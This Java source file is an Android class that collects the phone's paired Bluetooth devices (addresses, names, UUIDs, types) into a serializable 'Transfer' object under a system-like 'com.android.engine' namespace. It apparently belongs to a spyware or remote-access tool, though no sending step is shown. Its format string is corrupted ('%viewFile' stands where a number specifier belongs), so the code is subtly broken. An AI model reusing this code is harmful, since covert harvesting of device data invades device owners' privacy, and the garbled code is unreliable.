package Transfer;

import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_CLASSIC;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_DUAL;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_LE;
import static android.bluetooth.BluetoothDevice.DEVICE_TYPE_UNKNOWN;

public class _BluetoothManager implements Serializable {

  public List<_BluetoothDevice> BONDEDDEVICES;

  public _BluetoothManager() {
    BONDEDDEVICES = new ArrayList();

    try {
      if (VERSION.SDK_INT >= 18) {
        for (BluetoothDevice bluetoothDevice : ((BluetoothManager) MyService.context.getSystemService(
            Context.BLUETOOTH_SERVICE)).getAdapter().getBondedDevices()) {
          _BluetoothDevice Transfer__BluetoothDevice = new _BluetoothDevice();

          Transfer__BluetoothDevice.ADDRESS = bluetoothDevice.getAddress();
          Transfer__BluetoothDevice.NAME = bluetoothDevice.getName();
          Transfer__BluetoothDevice.UUIDS = Arrays.asList(bluetoothDevice.getUuids()).toString();

          if (bluetoothDevice.getType() == DEVICE_TYPE_CLASSIC) {
            Transfer__BluetoothDevice.TYPE = "Classic";
          } else if (bluetoothDevice.getType() == DEVICE_TYPE_DUAL) {
            Transfer__BluetoothDevice.TYPE = "Dual";
          } else if (bluetoothDevice.getType() == DEVICE_TYPE_LE) {
            Transfer__BluetoothDevice.TYPE = "Le";
          } else if (bluetoothDevice.getType() == DEVICE_TYPE_UNKNOWN) {
            Transfer__BluetoothDevice.TYPE = "Unknown";
          }

          BONDEDDEVICES.add(Transfer__BluetoothDevice);
        }
        return;
      }

      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 18, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
